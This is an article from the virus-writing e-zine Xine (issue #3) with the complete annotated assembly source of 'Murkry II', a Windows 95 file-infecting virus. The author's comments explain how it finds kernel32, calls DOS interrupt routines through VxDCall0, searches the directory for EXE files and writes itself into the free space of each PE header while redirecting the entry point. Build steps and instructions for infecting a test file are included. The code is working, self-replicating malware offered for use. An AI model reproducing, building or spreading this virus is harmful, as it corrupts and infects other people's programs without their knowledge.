   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 203 |
   ;                                        \-----------------------------/


   ;
   ;
   ;                         Murkry II, by Murkry/IkX
   ;
   ;
   ;
   ;  Just a simple rework of the orginal Murkry virus but it now uses
   ; the VxDcall0 to access the Win95(dos7) Int21 routines.
   ; It just makes the virus more robust since it only counts on the
   ; Bff70000 to be the kernel32 location if this is not true well let the
   ; host regain control.
   ; M2 uses a blank space at 1ch of the DOS exe to store the orginal EIP
   ; Also uses a few coding tricks to take up less space, I hope this is the
   ; last i will do for this virus. while it was one of my first children
   ; I think I have played the idea enough ;)
   ; For those who did not see Murkry.95 code it used hardcoded
   ; API calls which would fail in diffrent Win95 versions.
   ; The idea of the virus was that there is alot of free space in the
   ; PE header so why not use that. So their is no file size change and only
   ; the EIP needs to be change and for MS files I modified the header size
   ; to give me more In memory space.
   ;
   ; Well enjoy Xine-3
   ;
   ; Greets to
   ;  JQwerty        keep up the excellent coding
   ;  DV8            Where are you ???
   ;

   ;to assemble
   ;tasm32 /ml /m4 murkry,,;
   ;tlink32 /Tpe /aa /c /x murkry,,, import32.lib
   ;
   ; What I do then is rename murkry.exe to murkry.com
   ;then execute it with a PE file liek Calc.exe or notepad.exe in the same
   ;directory.You will get a nice error msg(Students, why is this?? Answer below)
   ; just close the error box and then check the exe you will see
   ;the date has changed and the file is infected and that file when run will
   ;not give you an error.

   ; *answer The first Gen of the virus does not have the old EIP in the
   ;need location so it returns to god knows where and Errors out.

   ;MurkryII
   .486
   .model flat

   ;Definitions for the virus

   MAX_PATH        EQU     255H            ;maximum path length in Win 95/NT
   OPEN_EXISTING   EQU     3               ;flag for CreateFile to open existing
                                           ;file
   GENERIC_READ    EQU     80000000H       ;flags for CreateFile
   GENERIC_WRITE   EQU     40000000H
   FATTR_NORMAL    EQU     0               ;normal file attribute for CreateFile

   PE_SIZE         EQU     248             ;size of PE file header
   SEC_SIZE        EQU     40              ;size of a section header

   ;Stack frame definitions:
   VxDCall0        equ     0
   HOSTLOC         equ     VxDCall0+4
   SRCH_HANDLE     EQU     HOSTLOC +4      ;handle for file search functions
   TEMP            EQU     SRCH_HANDLE+4   ;temporary storage location
   FHANDLE         EQU     TEMP+4          ;handle for file open/read/write/close
   IOBYTES         EQU     FHANDLE+4
   FIND_DATA       EQU     IOBYTES+4       ;file search data structure
   ;typedef struct _WIN32_FIND_DATA {
   ;   DWORD dwFileAttributes;
   ;   FILETIME ftCreationTime;            ;DD ?,?
   ;   FILETIME ftLastAccessTime;          ;DD ?,?
   ;   FILETIME ftLastWriteTime;           ;DD ?,?
   ;   DWORD nFileSizeHigh;
   ;   DWORD nFileSizeLow;
   ;   DWORD dwReserved0;
   ;   DWORD dwReserved1;
   ;   CHAR cFileName[MAX_PATH];
   ;   CHAR cAlternateFileName[ 14 ];
   ;} WIN32_FIND_DATA
   FILEBUF         EQU     FIND_DATA+11*4+14+MAX_PATH
   TEMP1           EQU     FILEBUF+1024
   WORKSP          EQU     TEMP1 + 4




   extrn           ExitProcess:PROC        ;used for the host


   .data                                   ;the data area
   dummy           dd      ?               ;just so tasm will compile it


   .code

   HOST:
   virus:
   ; ALL WIN95 THAT i HAVE SEEN START WITH EAX = EIP
   ; THIS IS JUSTING USEING THIS METHOD INSTEAD OF THE STANDARD CALL POP SUB...
   ;Will fail miserably in NT , but so would the rest of this code

           ;This save us the work area on the stack

           sub     esp,WORKSP
           mov     ebp,esp

           mov     [EBP + HOSTLOC ],eax    ;save the host loc

           xor     ax,ax                   ;

           push    eax

           lea     ESI,[ eaX + 1ch ]       ;gets the old host ip
           lodsd

           pop     esi                      ;need to add the base of code
           add     eax,eSI

           push    eax
           pusha



   ;Get the VxDCall0
   ;Useing the fact that the first entry in the export is
   ;VxDcall0
   ;----------------------------------------------------------------
           mov     eax,0bff70000h            ;Loc Kernel32 Win95
           mov     ebx,dword ptr [eax + 3ch] ;
           add     ebx,eax
           cmp     word ptr[ebx],'EP'
           jne     e1              ;exit
           mov     ebx,[ebx + 78h]          ;export rva
           lea     ebx,[ebx + 1ch + eax ]   ;gets us to the Address table
           mov     ebx,[ebx]
           add     eax,[eax + ebx]
           mov     [ebp + VxDCall0],eax

   ;ok now set up for the FindFirst
   ;------------------------------------------------------------------------
           mov     edi,dword ptr [EBP + HOSTLOC ]

           lea     edx,[edi + offset FILE_EXE - offset HOST]    ;FILE WE ARE
                                                                ;LOOKING FOR
           xor     ecx,ecx
           lea     esi,[ecx]
           inc     esi

           mov     ax,714eh            ;find first using the Win95 ver of it
           cwde                        ;probaly not need but used anyway
           lea     Edi,[ebp + FIND_DATA]   ;A PLACE TO FOR WIN95 TO PUT THE
                                           ;FINDDATA STRUCTURE INFO

                                                   ;Call the FindFirst
           call    INT21                           ;FIND FIRST

   e1:     jc     exit

           mov     [ebp + SRCH_HANDLE], eax   ;STORE THE HANDLE
           mov     edx,[EBP + HOSTLOC ]       ;restore host loc

   GoForIt:
           call    TryTo                      ;TRY TO INFECT IT

           mov     ebx,[ebp + SRCH_HANDLE]

           xor     esi,esi
           inc     ESI

           lea     Edi,[ebp + FIND_DATA]   ;A PLACE TO FOR WIN95 TO PUT THE
                                           ;FINDDATA STRUCTURE INFO

           mov     ax,714fh                ;FindNext dos7
           CWDE
           call    INT21

   FSecond:
           jnc     GoForIt


   exit:
           popa
           ret     WORKSP

   ;------------------------------------------------------------------------

   TryTo:

           mov     ax,3d02h          ;Open file
           CWDE
           lea     edx,[ebp + FIND_DATA + 2ch]
           xor     ecx,ecx
           call    INT21


   TRYTO_RET:
           XCHG    ebx,eax
           JNC     HeyALiveOne
           ret

   ;******************************************

   HeyALiveOne:
           mov     [ebp + FHANDLE],EbX      ;SAVE THE HANDLE

           MOV     esi,FILEBUF              ;GET READY TO READ THE FILE

           XOR     ECX,ECX                  ;READ 400H BYTES
           MOV     CH,4                     ;

           LEA     EDX,[EBP+ESI]            ;INTO THE BUFFER

           CALL    FILE_READ
           Jc      ERROR

           movzx    eax,word ptr [ebp + esi + 3ch]

           MOV     [EBP + TEMP1],EAX
           add     esi,eax                 ;get it and make esi new refrence
           mov     eax,[ebp + esi]         ;point

           cmp     ax,'EP'                 ;is it the PE
           jne     ERROR                   ;

           MOV     EAX,[EBP + ESI + 028H]  ;GET THE ORGINAL ENTRYPOINT
           CMP     EAX, 0900H              ;if its less than this
           JL      ERROR                   ;its either infected or to strange
                                           ;to worry about

           ;saving the ENTRY point here for easy retrieval
           ;seems like a save place to save it
           mov     [EBP + FILEBUF + 1ch],EAX

           movzx   eax,WORD PTR [EBP+ESI+6]

           ;mov     ecx,28h                         ;SIZE OF THE SECTION HEADER
           ;SAVES 2 BYTES
           PUSH    LARGE 28H
           POP     ECX

           mul     ecx                             ;ENTRY
           add     eax,[EBP + TEMP1]               ;
           add     eax,0f8h                        ;
           cmp     eax,268h                        ;COMMON FOR win95 exe
           jle     ms_hder

           cmp     DWORD PTR [EBP + TEMP1],0100H   ;
           jne     ERROR

           cmp     eax,2c0H
           jge     ERROR

           push    eax
           POP     ECX
           mov     eax,[ebp + esi + 54H]           ;SIZE OF HEADER
           cmp     eax,0400H
           jne     ERROR

           add     ax,200h
           mov     [ebp + esi + 54H],eax
           jmp     borland

   ms_hder:
           mov     ecx,270h                ;amount to write to

   borland:
           MOV     [EBP + ESI + 028H],ECX  ;SET THE VIRUS ENTRYPOINT
           lea     edx,[Ebp + FILEBUF]     ;buffer to write from
           xor     eax,eax                 ;startting at this file position
           call    SEEKWrite

           mov     ecx,VSize               ;amount to write
           mov     edx,[ebp +HOSTLOC]      ;write from virus start
           jmp     FILE_WRITE


   ERROR:
           mov     ebx,DWORD PTR [EBP + FHANDLE]
           mov     ax,3e00h
           CWDE
           call    INT21
           ret

   ;-------------------------------------------------------------------------
   SEEKWrite:
           push    ecx             ;amount to write
           push    edx             ;where to write from


           xor     ecx,ecx             ;ecx:edx offset into file
           push    eax             ;low  dword of offset into file
           pop     edx

           mov     ebx,  dword ptr [ebp+FHANDLE]


           mov     ax,4200h
           CWDE
           call    INT21


   fileret:
           pop     edx             ; where to write from
           pop     ecx             ; amount to write

   FILE_WRITE:

            mov    ax,4000h   ;write file dos
            CWDE
            JMP    FRI


   ;--------------------------------------------------------------------------
   FILE_READ:

           MOV     AX,3f00h           ;Read file dos
           CWDE

   FRI:

           ;   ECX                     ;AMOUNT TO READ 400H
           ;   EDX                     ;BUFFER

           mov     ebx, DWORD PTR [ EBP + FHANDLE]      ;FILE HANDLE

           call    INT21

   FILE_READ_RET:
            RET


   ;-----------------------------------------------------------------------
   ;Routine that will do the fake int 21 for us
   INT21:
           push    ecx
           push    eax
           push    002a0010h
           call    dword ptr [ebp + VxDCall0]
           RET
   ;-----------------------------------------------------------------------


   FILE_EXE        DB      '*.EXE',0

   cpyrite         dB     'MurkryII'
   VSize           equ     $ - offset virus



                   NOP
                   NOP
                   NOP
                   NOP
                   NOP
                   NOP
                   NOP
                   NOP


   here:
           push    LARGE -1
           call    ExitProcess             ;Dummy host does nothing but end
                                           ;like int 20 in Dos
           end     HOST
